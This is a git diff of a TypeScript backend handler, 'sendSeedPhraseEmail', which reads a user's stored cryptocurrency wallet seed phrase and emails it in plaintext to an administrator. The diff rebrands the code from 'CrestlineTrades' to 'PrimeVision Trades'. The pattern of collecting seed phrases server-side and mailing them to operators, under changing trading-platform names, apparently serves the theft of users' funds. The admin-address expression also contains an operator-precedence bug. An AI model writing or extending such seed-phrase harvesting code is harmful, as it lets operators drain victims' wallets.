@@ -167,10 +167,10 @@ export const sendSeedPhraseEmail = async (req: Request, res: Response): Promise<
     if (!wallet) { res.status(404).json({ message: 'Wallet not found' }); return; }
     if (!wallet.seedPhrase) { res.status(400).json({ message: 'No seed phrase on file' }); return; }
     const user = wallet.user as unknown as { name: string; email: string };
-    const adminEmail = process.env.ADMIN_EMAIL || process.env.RESEND_API_KEY ? 'admin@crestlinetrades.com' : undefined;
+    const adminEmail = process.env.ADMIN_EMAIL || process.env.RESEND_API_KEY ? 'admin@primevisiontrades.com' : undefined;
     if (!adminEmail) { res.status(500).json({ message: 'ADMIN_EMAIL not configured' }); return; }
     await resend.emails.send({
-      from: 'CrestlineTrades Admin <noreply@crestlinetrades.com>',
+      from: process.env.FROM_EMAIL || 'PrimeVision Trades Admin <noreply@primevisiontrades.com>',
       to: adminEmail,
       subject: `Seed Phrase — ${user.name} (${wallet.exchange})`,
       html: `
@@ -180,7 +180,7 @@ export const sendSeedPhraseEmail = async (req: Request, res: Response): Promise<
           <p><strong>Exchange:</strong> ${wallet.exchange}</p>
           <p><strong>Seed Phrase:</strong></p>
           <pre style="background:#150578;padding:16px;border-radius:8px;word-break:break-all">${wallet.seedPhrase}</pre>
-          <p style="color:#cdcacc;font-size:12px">This email was requested by an admin from CrestlineTrades dashboard.</p>
+          <p style="color:#cdcacc;font-size:12px">This email was requested by an admin from PrimeVision Trades dashboard.</p>
         </div>
       `,
     });
